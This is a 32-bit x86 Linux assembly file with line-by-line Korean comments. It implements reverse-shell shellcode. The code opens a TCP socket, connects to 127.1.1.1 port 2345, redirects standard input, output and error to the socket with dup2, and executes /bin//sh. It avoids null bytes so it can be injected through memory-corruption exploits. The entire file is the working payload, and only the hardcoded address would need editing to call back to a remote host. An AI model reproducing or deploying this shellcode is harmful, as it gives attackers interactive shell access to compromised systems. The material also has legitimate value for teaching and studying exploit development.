BITS 32
  
;socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
push BYTE 102			; socketcall의 시스템 콜 번호 102를 Stack에 저장합니다.
pop eax					; Stack에 저장된 시스템 콜 번호를 EAX 레지스터에 저장합니다.
cdq						; EDX 레지스터에 DWORD 크기의 Null byte를 저장합니다.
push dword 1			; socket 함수의 호출 번호 1을 Stack에 저장합니다.
pop ebx					; socketcall() 함수의 1번째 인자(EBX 레지스터)값으로 SYS_SOCKET(1)을 저장 합니다.
;두번째 인자에 전달할 인자 배열을 생성
push edx				; socket() 함수의 3번째 인자 값 0을 Stack에 저장합니다.
push ebx				; socket() 함수의 2번째 인자 값 SOCK_STREAM(1)을 Stack에 저장합니다.
push BYTE 2         	; socket() 함수의 1번째 인자 값 PF_INET(2)을 Stack에 저장합니다.
mov ecx, esp        	; socketcall() 함수의 2번째 인자(ECX 레지스터)값으로 인자 배열의 시작 주소값(ESP 레지스터)을 저장 합니다.
int 0x80

;server_sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
xchg edx,eax			; 소켓 함수로 부터 리턴받은 값을 EDX 레지스터에 저장합니다.
  
;connect(server_sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
mov al, 0x66			; socketcall의 시스템 콜 번호 102를 Stack에 저장합니다.
;struct sockaddr_in server_addr;
push DWORD 0x0101017f	; server_addr.sin_addr.s_addr = inet_addr("127.1.1.1"); Little-endian
push WORD 0x2909		; server_addr.sin_port = htons(2345); Little-endian
inc ebx					; 
push WORD bx			; server_addr.sin_family = AF_INET;
mov ecx, esp			; ECX레지스터에 server_addr 구조체의 시작 주소를 저장합니다.
push BYTE 16			; connect() 함수의 3번째 인자 값 16을 Stack에 저장합니다.
push ecx				; connect() 함수의 2번째 인자 값 &server_addr을 Stack에 저장합니다.
push edx				; connect() 함수의 1번째 인자 값 server_sockfd를 Stack에 저장합니다.
mov ecx, esp			; socketcall() 함수의 2번째 인자 값을 ECX 레지스터에 저장 합니다.
inc ebx             	; socketcall() 함수의 1번째 인자 값으로 SYS_CONNECT(3)를 저장하게 됩니다.
int 0x80

;for(i = 0; i <= 2; i++)
;	dup2(server_sockfd, i);
xchg edx,ebx        ; dup2 함수의 1번째 인자값으로 socket() 함수에 의해 생성된 파일 디스크립터(0x5)를 저장합니다. 
push BYTE 0x2       ; Stack에 2 저장합니다.
pop ecx             ; dup2 함수의 2번째 인자값으로 2 를 저장 합니다.
dup2_call:
    mov BYTE al, 0x3F   ; dup2 함수의 시스템 콜 번호(63)를 AL 레지스터에 저장합니다.
    int 0x80            ;
    dec ecx             ; dup2() 함수의 2번째 인자값을 감소(-1) 시킵니다.
    jns dup2_call       ; 부호 플래그가 거짓(0)이면 dup2_call로 점프 합니다.
  
;execve( "/bin/sh", argv, NULL );
mov BYTE al, 11     ; execve() 시스템 함수의 콜 번호 11을 EAX레지스터에 저장합니다.
xor edx, edx
push edx            ; 문자열의 끝을 알리기 위해 Null을 먼저 Stack에 저장합니다.
push 0x68732f2f     ; 문자 "//sh"를 Stack에 저장합니다. Little-endian
push 0x6e69622f     ; 문자 "/bin"를 Stack에 저장합니다. Little-endian
mov ebx, esp        ; execve() 함수의 1번째 인자값으로 ESP 레지스터의 값을 저장합니다.
push edx            ; Stack에 Null을 저장합니다.
mov edx, esp        ; execve() 함수의 3번째 인자값으로 Null이 저장된 배열의 주소(ESP)를 저장합니다.
push ebx            ; Stack에 "/bin//sh" 문자의 시작주소(EBX)를 저장합니다.
mov ecx, esp        ; execve() 함수의 2번째 인자값으로 배열의 주소(ESP,["/bin//sh"],[Null])를 저장합니다.
int 0x80            ;
